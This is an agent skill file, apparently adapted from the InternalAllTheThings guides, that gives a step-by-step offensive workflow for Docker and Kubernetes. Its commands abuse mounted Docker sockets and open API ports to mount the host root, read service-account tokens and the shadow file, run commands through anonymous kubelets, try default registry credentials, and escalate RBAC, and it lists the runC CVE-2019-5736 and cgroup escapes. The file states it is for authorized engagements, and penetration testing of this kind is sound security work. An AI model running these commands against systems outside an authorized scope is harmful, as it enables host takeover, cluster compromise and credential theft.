---
name: container-security
description: >-
  Assess Docker and Kubernetes: exposed Docker socket, privileged containers, host mounts and
  namespace escapes, Kubernetes API and RBAC misconfiguration, kubelet and etcd exposure, and
  in-container credential discovery. Use when an engagement includes containers or a cluster, when
  you land inside a pod, or when reviewing container and Kubernetes hardening.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "2"
  generated-by: build/build.py
---

# Docker and Kubernetes Security

Container work splits into two questions that look similar and are not. Inside a Docker container the question is what the container was given - a mounted socket, an open API port, elevated capabilities, a host device - because each of those selects a different escape and none of them can be discovered later. Inside a Kubernetes pod the question is what the service account can do, because the pod is already inside the trust boundary and the escape is an API call, not a kernel trick. Done means: an identified boundary (container to host, or pod to cluster), the prerequisite that made it crossable, and evidence from the far side.

## When to use this skill

- You have command execution inside a container and need to establish whether the host is reachable.
- You found `/var/run/docker.sock` mounted, an exposed 2375/2376 API, or an unauthenticated Docker registry.
- You are in a pod and need to move to the cluster control plane, another namespace, or the node.
- You are reviewing container/Kubernetes hardening: privileged pods, hostPath, RBAC, kubelet and etcd exposure.
- Not this skill: the cloud account behind the cluster → `aws-security` / `azure-entra-security`; the pipeline that built the image → `cicd-supply-chain-security`; AD credentials found on a compromised node → `active-directory-credentials`.

## First moves

1. Test the single highest-yield prerequisite first: is the Docker socket mounted? Portainer-style deployments leave it exposed as a matter of course.

```bash
ls -l /var/run/docker.sock
curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json
```

A JSON container list means full control of the host's Docker daemon - you can create a privileged container that mounts `/`.

2. Run a combined enumerator before hand-testing each prerequisite; DEEPCE checks for the socket, capabilities and common escape paths in one pass:

```bash
./deepce.sh
./deepce.sh --no-enumeration --exploit SOCK --shadow
./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
```

3. If no socket but a Docker API port answers, point the client at it directly. 2376 is the TLS port, 2375 the plaintext one:

```bash
nmap -sCV 10.10.10.10 -p 2376
export DOCKER_HOST=tcp://10.10.10.10:2376
docker -H tcp://10.10.10.10:2375 ps
docker run --name ubuntu_bash --rm -i -v /:/mnt -u 0 -t ubuntu bash
```

4. An open registry is a credential and source-code leak, not just an image store. Fingerprint with the `Docker-Distribution-Api-Version` header, then walk the catalog:

```bash
curl -s -k --user "admin:admin" https://docker.registry.local/v2/_catalog
curl -s -k --user "admin:admin" https://docker.registry.local/v2/wordpress-image/tags/list
docker pull docker.registry.local/wordpress-image && docker run -it docker.registry.local/wordpress-image /bin/bash
```

5. In a pod, read the service-account material first - three files give you an authenticated API client with no tooling required:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
echo $KUBERNETES_SERVICE_HOST $KUBERNETES_SERVICE_PORT
```

6. Establish the permission set before attempting anything. `auth can-i --list` is namespace-scoped; the kube-system variant is the cluster-level view:

```bash
kubectl auth can-i --list
kubectl auth can-i --list --namespace=kube-system
```

Without `kubectl`, the same answer comes from `SelfSubjectRulesReview` against the API server using the token and `ca.crt` above.

7. Nodes are reachable without any RBAC at all when the kubelet allows anonymous auth - check it before fighting the API server:

```bash
curl -ks https://worker:10250/pods
curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} -d 'input=1' -d 'output=1' -d'tty=1' -d 'command=ls' -d 'command=/'
```

## Reference map

| Reference | Read it when | Key content |
|---|---|---|
| [docker.md](references/docker.md) | you are inside a container, or a Docker daemon/socket/registry is exposed | tools (dockscan, deepce, dlayer, dive), socket and open-API abuse, registry catalog and blob pull, cgroup v1 `release_agent`, `core_pattern`, runC CVE-2019-5736, device-file `fdpasser`, privileged kernel-module escape |
| [kubernetes.md](references/kubernetes.md) | you are in a pod, or a cluster API, kubelet or etcd is exposed | in-pod environment, SA token use, `auth can-i`, secrets/ConfigMap discovery, RBAC abuse (pod create, rolebinding patch, impersonation), kubelet 10250/10255, etcd 2379, badpods manifests, gitRepo volume RCE |

## Workflow

**Step 0 - decide which branch you are on.** `kubectl auth can-i --list` succeeding, or `/var/run/secrets/kubernetes.io/serviceaccount/token` existing, means Kubernetes: go to the cluster branch. Otherwise you are in a plain container: go to the Docker branch.

**Docker branch - pick the escape by the prerequisite you actually observed.** Do not run all of them; each has a different blast radius.

| Observed | Path | Where |
|---|---|---|
| `/var/run/docker.sock` mounted | Docker API via unix socket, then `chroot /host` or a privileged container with `-v /:/mnt` | `docker.md` Mounted Docker Socket |
| 2375/2376 answering | `DOCKER_HOST` + `docker run --privileged -v /:/mnt` | `docker.md` Open Docker API Port |
| `--privileged`, or `CAP_SYS_ADMIN` with `apparmor=unconfined` | cgroup v1 `release_agent` (needs cgroup v1), or `core_pattern` coredump handler | `docker.md` cgroup v1 section |
| `/dev/kmsg` visible | privileged container: host devices under `/dev`, host disks reachable | `docker.md` device file / privileged |
| runC unpatched | CVE-2019-5736 - overwrite the host `runc` via `docker exec` | `docker.md` Breaking out via runC |
| privileged + kernel headers | load a kernel module, then `/proc/escape` | `docker.md` kernel modules |

1. Socket or open API: authenticate to the daemon, then escape by mounting the host root into a container. This is the cleanest path and leaves the least noise.
2. No daemon access but privileged or `CAP_SYS_ADMIN`: use the kernel surface. cgroup v1 `release_agent` needs `mount -t cgroup -o rdma` to succeed; `core_pattern` needs a writable `/proc/sys/kernel/core_pattern` and a way to trigger a coredump. Check the cgroup version before choosing.
3. Registry only: enumerate the catalog, pull and run images, and inspect layers (`docker save image:tag | dlayer -i`, or `dive`) for secrets baked into the image - the registry itself is the finding if you can push.
4. Neither socket, API, privilege nor registry: you are in a well-configured container. Record that and pivot to the application and its credentials instead of burning time on kernel escapes.

**Kubernetes branch**

1. Map permissions: `kubectl auth can-i --list` (or `SelfSubjectRulesReview`), then `--namespace=kube-system` for the cluster-level set.
2. Convert permissions to a path, in this order of preference: `get/list secrets` → read every namespace's secrets and service-account tokens; `get/patch rolebindings` → bind `admin` ClusterRole to your service account; `create pods` → deploy a `badpods` manifest (privileged, hostPath, hostPID, hostNetwork) into `kube-system`; `pods/exec` → `kubectl exec -it <pod> -n <ns> -- sh`; `impersonate` → `Impersonate-Group: system:masters`.
3. Node route: kubelet on 10250 with anonymous auth gives `/pods` and `/exec` without any token; 10255 is the read-only kubelet; etcd on 2379 with no auth is the entire cluster state; 8080 is an insecure API server.
4. Escape from a privileged pod the same way as Docker: `/dev/kmsg` present means host devices are mounted, and a hostPath pod mount exposes the node filesystem directly.

## Gotchas

- The cgroup `release_agent` technique is cgroup **v1** only. On a v2 host `mount -t cgroup -o rdma` fails and the correct path is `core_pattern`, not a retry loop.
- "Privileged" has no official in-container check. The working heuristic is whether `/dev/kmsg` exists; treat it as a signal, not proof.
- Kubelet 10250 exec requires `--anonymous-auth` to be enabled. `/pods` answering does not guarantee `/exec` works, and vice versa on older builds.
- A registry is fingerprinted by the `Docker-Distribution-Api-Version` response header; an HTTP 401 on `/v2/_catalog` still confirms a registry exists and may accept default credentials (`admin:admin`).
- In a pod, Secrets and ConfigMaps are always mounted read-only tmpfs - find them with `grep -F "tmpfs ro" /etc/mtab`. True volumes are usually ext4 (`grep -wF "ext4" /etc/mtab`). Both look identical as environment variables, so every env var has to be inspected individually.
- Most containers have no `kubectl`. Run the command locally with `kubectl -v9 ...` to capture the exact URL, body and headers, then replay against `KUBERNETES_SERVICE_HOST`/`PORT` with the pod's token and `ca.crt`.
- Reflected in the recipes above: several manifests in this corpus (rolebinding JSON) contain typos as published. Validate YAML/JSON before applying - a 400 from the API server is usually malformed input, not a permission denial.
- CVE-2019-5736 overwrites the host `runc` binary. It is a persistence-grade, host-wide change with a real chance of breaking the node - only use it when you intend to leave a mark.
- Docker socket access is equivalent to root on the host; do not treat it as a container-level finding in the report.

## Authorized use

These techniques are for authorized engagements only, with explicit permission and within the agreed scope. Container escapes affect the shared host, so confirm whether the target is a shared platform before running anything with host-wide blast radius.

## Source

Converted from the upstream InternalAllTheThings Docker and Kubernetes guides (https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
